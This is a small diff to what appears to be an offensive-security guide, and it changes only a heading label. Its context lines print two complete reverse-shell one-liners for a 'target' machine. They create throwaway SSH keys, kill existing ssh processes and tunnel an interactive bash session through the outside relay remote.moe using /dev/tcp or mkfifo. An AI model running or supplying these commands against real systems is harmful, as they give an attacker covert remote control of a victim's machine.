@@ -972,7 +972,7 @@ On the target(needs SSH and Bash):
 bash -c '(killall ssh; rm -f /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r; ssh -i /tmp/.r -o StrictHostKeyChecking=no -L31338:uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 -Nf remote.moe;  bash -i &>/dev/tcp/0/31338 0>&1 &)' &>/dev/null
 ```
 
-On the target (needs ssh, bash and mkfifo):
+On the target (alternative; needs ssh, bash and mkfifo):
 ```sh
 rm -f /tmp/.p /tmp/.r; ssh-keygen -q -t rsa -N "" -f /tmp/.r && mkfifo /tmp/.p && (bash -i</tmp/.p  2>1 |ssh -i /tmp/.r -o StrictHostKeyChecking=no -W uydsgl6i62nrr2zx3bgkdizlz2jq2muplpuinfkcat6ksfiffpoa.remote.moe:31337 remote.moe>/tmp/.p &)
 ```
